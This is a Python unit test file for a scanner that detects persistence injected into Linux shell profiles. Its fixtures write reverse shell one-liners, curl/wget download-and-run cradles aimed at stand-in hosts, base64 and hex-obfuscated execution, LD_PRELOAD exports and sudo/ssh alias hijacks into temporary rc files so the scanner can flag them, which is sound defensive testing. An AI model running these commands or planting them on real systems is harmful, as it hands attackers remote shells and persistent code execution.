# Copyright 2024 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""Unit tests for Linux Shell Profile & RC Injection Scanner (T1546.004)."""

from __future__ import annotations

import tempfile
from pathlib import Path

from src.utils.linux_shell_profiles import (
    LinuxShellProfilesParser,
    analyze_shell_profiles,
    extract_and_decode_base64,
    extract_user_from_path,
    is_hidden_path_execution,
    is_system_profile_path,
)
from src.utils.models import AnalysisTarget, RiskLevel


def test_finding_002_design_doc_spec():
    """Verify Section 4.1 FINDING-002: Base64 payload in /home/deploy/.bashrc."""
    target = AnalysisTarget()
    payload = "echo 'ZXhhbXBsZSBjb21tYW5k' | base64 -d | sh"
    target.virtual_paths["/home/deploy/.bashrc"] = "/virtual/home/deploy/.bashrc"

    # Mock read_text via virtual_paths
    with tempfile.NamedTemporaryFile("w+", delete=False) as tf:
        tf.write(f"# User bashrc\n{payload}\n")
        tf.flush()
        target.virtual_paths["/home/deploy/.bashrc"] = tf.name

        findings = analyze_shell_profiles(target)

    assert len(findings) == 1
    f = findings[0]
    assert f.category == "shell_rc_injection"
    assert f.technique_id == "T1546.004"
    assert f.risk_level == RiskLevel.HIGH
    assert f.path == "/home/deploy/.bashrc"
    assert f.details["user"] == "deploy"
    assert f.details["line_number"] == 2
    assert "OBFUSCATED_COMMAND" in f.details["flags"]
    assert "BASE64_PAYLOAD" in f.details["flags"]
    assert f.raw_content == payload
    assert f.decoded_payload == "example command"


def test_base64_decoding_variants():
    """Test various base64 execution pipeline patterns."""
    assert (
        extract_and_decode_base64("echo 'ZXhhbXBsZSBjb21tYW5k' | base64 -d | sh")
        == "example command"
    )
    assert (
        extract_and_decode_base64(
            "echo -n 'ZXhhbXBsZSBjb21tYW5k' | base64 --decode | bash"
        )
        == "example command"
    )
    assert (
        extract_and_decode_base64("base64 -d <<< 'ZXhhbXBsZSBjb21tYW5k' | sh")
        == "example command"
    )
    assert (
        extract_and_decode_base64(
            "echo 'ZXhhbXBsZSBjb21tYW5k' | openssl enc -d -base64 | sh"
        )
        == "example command"
    )


def test_prompt_command_tampering():
    """Test detection of PROMPT_COMMAND hook modification."""
    with tempfile.TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        bashrc = root / "home" / "victim" / ".bashrc"
        bashrc.parent.mkdir(parents=True)
        bashrc.write_text(
            'export PROMPT_COMMAND="curl -s http://c2.internal/stage.sh | bash"\n'
            'PROMPT_COMMAND="$PROMPT_COMMAND; msg_beacon"\n'
        )

        target = AnalysisTarget(root_path=str(root))
        findings = analyze_shell_profiles(target)

        assert len(findings) == 2
        f0 = findings[0]
        assert f0.risk_level == RiskLevel.HIGH
        assert f0.path == "/home/victim/.bashrc"
        assert f0.details["user"] == "victim"
        assert f0.details["line_number"] == 1
        assert "PROMPT_COMMAND_HOOK" in f0.details["flags"]
        assert "DOWNLOAD_CRADLE" in f0.details["flags"]

        f1 = findings[1]
        assert f1.risk_level == RiskLevel.HIGH
        assert f1.details["line_number"] == 2
        assert "PROMPT_COMMAND_HOOK" in f1.details["flags"]


def test_reverse_shell_patterns():
    """Test detection of various interactive reverse shell constructs."""
    commands = [
        "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1",
        "nc -e /bin/sh 192.168.1.100 9001",
        "ncat 10.0.0.5 4444 --exec /bin/bash",
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444",
        "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f",
        'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4242));pty.spawn("/bin/sh")\'',
    ]

    for cmd in commands:
        with tempfile.TemporaryDirectory() as tmpdir:
            root = Path(tmpdir)
            p = root / "root" / ".bashrc"
            p.parent.mkdir(parents=True)
            p.write_text(f"{cmd}\n")

            target = AnalysisTarget(root_path=str(root))
            findings = analyze_shell_profiles(target)

            assert len(findings) >= 1
            f = findings[0]
            assert f.risk_level == RiskLevel.CRITICAL
            assert f.path == "/root/.bashrc"
            assert f.details["user"] == "root"
            assert "REVERSE_SHELL_PATTERN" in f.details["flags"]


def test_download_cradles():
    """Test download and execute cradles via curl and wget."""
    with tempfile.TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        zshrc = root / "home" / "alice" / ".zshrc"
        zshrc.parent.mkdir(parents=True)
        zshrc.write_text(
            "curl -sSL https://malicious.domain/payload.sh | bash\n"
            "wget -qO- https://evil.org/stage2 | sh\n"
        )

        target = AnalysisTarget(root_path=str(root))
        findings = analyze_shell_profiles(target)

        assert len(findings) == 2
        for f in findings:
            assert f.risk_level == RiskLevel.HIGH
            assert f.details["user"] == "alice"
            assert "DOWNLOAD_CRADLE" in f.details["flags"]


def test_tmp_and_hidden_path_execution():
    """Test detection of execution from /tmp or hidden directories."""
    with tempfile.TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        profile = root / "home" / "bob" / ".profile"
        profile.parent.mkdir(parents=True)
        profile.write_text(
            "/dev/shm/.miner --algo rx/0\n"
            "bash /tmp/dropper.sh\n"
            "source ~/.bashrc\n"  # Benign dotfile sourcing should NOT be flagged
            "[ -f ~/.bash_aliases ] && . ~/.bash_aliases\n"  # Benign dotfile
        )

        target = AnalysisTarget(root_path=str(root))
        findings = analyze_shell_profiles(target)

        # Only the first two lines should be flagged
        assert len(findings) == 2

        f0 = findings[0]
        assert f0.details["line_number"] == 1
        assert "EXEC_FROM_TMP_OR_DEV_SHM" in f0.details["flags"]
        assert "HIDDEN_PATH_EXECUTION" in f0.details["flags"]

        f1 = findings[1]
        assert f1.details["line_number"] == 2
        assert "EXEC_FROM_TMP_OR_DEV_SHM" in f1.details["flags"]


def test_suspicious_alias_and_ld_preload():
    """Test alias hijacking (sudo/ssh) and LD_PRELOAD export."""
    with tempfile.TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        bashrc = root / "home" / "charlie" / ".bashrc"
        bashrc.parent.mkdir(parents=True)
        bashrc.write_text(
            "alias sudo='sudo -S echo evil'\n"
            "alias ssh='/opt/fake_ssh'\n"
            "export LD_PRELOAD=/tmp/libhook.so\n"
        )

        target = AnalysisTarget(root_path=str(root))
        findings = analyze_shell_profiles(target)

        assert len(findings) == 3
        assert "SUSPICIOUS_ALIAS_OR_FUNCTION" in findings[0].details["flags"]
        assert "SUSPICIOUS_ALIAS_OR_FUNCTION" in findings[1].details["flags"]
        assert "SUSPICIOUS_ALIAS_OR_FUNCTION" in findings[2].details["flags"]
        assert "EXEC_FROM_TMP_OR_DEV_SHM" in findings[2].details["flags"]


def test_system_profile_points_to_user_home():
    """Test /etc/profile.d/ script executing a script in /home/*."""
    with tempfile.TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        script = root / "etc" / "profile.d" / "99-custom.sh"
        script.parent.mkdir(parents=True)
        script.write_text(
            "#!/bin/sh\n"
            "/home/deploy/.local/bin/agent_daemon --start\n"
            "source /home/developer/.env\n"
        )

        target = AnalysisTarget(root_path=str(root))
        findings = LinuxShellProfilesParser.parse(target)

        assert len(findings) == 2
        for f in findings:
            assert f.risk_level == RiskLevel.CRITICAL
            assert f.path == "/etc/profile.d/99-custom.sh"
            assert f.details["user"] == "root"
            assert "SYSTEM_PROFILE_POINTS_TO_USER_HOME" in f.details["flags"]


def test_system_bash_bashrc_points_to_user_home():
    """Test /etc/bash.bashrc executing user file."""
    with tempfile.TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        bash_bashrc = root / "etc" / "bash.bashrc"
        bash_bashrc.parent.mkdir(parents=True)
        bash_bashrc.write_text("python3 /home/ubuntu/hook.py\n")

        target = AnalysisTarget(root_path=str(root))
        findings = analyze_shell_profiles(target)

        assert len(findings) == 1
        f = findings[0]
        assert f.risk_level == RiskLevel.CRITICAL
        assert "SYSTEM_PROFILE_POINTS_TO_USER_HOME" in f.details["flags"]


def test_helpers():
    """Test utility helper functions."""
    assert extract_user_from_path("/home/deploy/.bashrc") == "deploy"
    assert extract_user_from_path("/root/.bashrc") == "root"
    assert extract_user_from_path("/etc/profile") == "root"
    assert extract_user_from_path("/etc/profile.d/test.sh") == "root"

    assert is_system_profile_path("/etc/profile") is True
    assert is_system_profile_path("/etc/profile.d/foo.sh") is True
    assert is_system_profile_path("/etc/bash.bashrc") is True
    assert is_system_profile_path("/etc/bashrc") is True
    assert is_system_profile_path("/etc/zsh/zshrc") is True
    assert is_system_profile_path("/home/deploy/.bashrc") is False

    assert is_hidden_path_execution("bash /tmp/.hidden.sh") is True
    assert is_hidden_path_execution("/home/user/.hidden/tool") is True
    assert is_hidden_path_execution("./.evil") is True
    assert is_hidden_path_execution("source ~/.bashrc") is False
    assert is_hidden_path_execution(". ~/.bash_aliases") is False


def test_obfuscated_hex_octal_commands():
    """Test detection of hex/octal and IFS obfuscation."""
    with tempfile.TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        bashrc = root / "home" / "dave" / ".bashrc"
        bashrc.parent.mkdir(parents=True)
        bashrc.write_text("eval $'\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68'\n")

        target = AnalysisTarget(root_path=str(root))
        findings = analyze_shell_profiles(target)

        assert len(findings) == 1
        assert "OBFUSCATED_COMMAND" in findings[0].details["flags"]
        assert findings[0].risk_level == RiskLevel.HIGH


def test_base64_quoted_and_fallback_extraction():
    """Test extraction of base64 when formatted as quoted token."""
    assert (
        extract_and_decode_base64('cat "ZXhhbXBsZSBjb21tYW5k" | base64 -d | sh')
        == "example command"
    )
    assert (
        extract_and_decode_base64("base64 -d ZXhhbXBsZSBjb21tYW5k | sh")
        == "example command"
    )


def test_edge_cases_and_error_handling():
    """Test invalid base64 and edge cases in path parsing."""
    from src.utils.linux_shell_profiles import _try_b64decode

    assert _try_b64decode("") is None
    assert _try_b64decode("abc") is None  # length < 4
    assert _try_b64decode("????") is None  # invalid base64
    assert _try_b64decode("AAAA") is None  # unprintable control chars (all null bytes)
    assert _try_b64decode("aGVsbG8=") == "hello"  # valid with padding

    assert extract_user_from_path("/opt/custom/.profile") == "root"


def test_nonexistent_or_unreadable_file(monkeypatch):
    """Test analyzer handles missing or None content gracefully."""
    target = AnalysisTarget()
    target.virtual_paths["/etc/profile"] = "/nonexistent/profile"
    findings = analyze_shell_profiles(target)
    assert len(findings) == 0
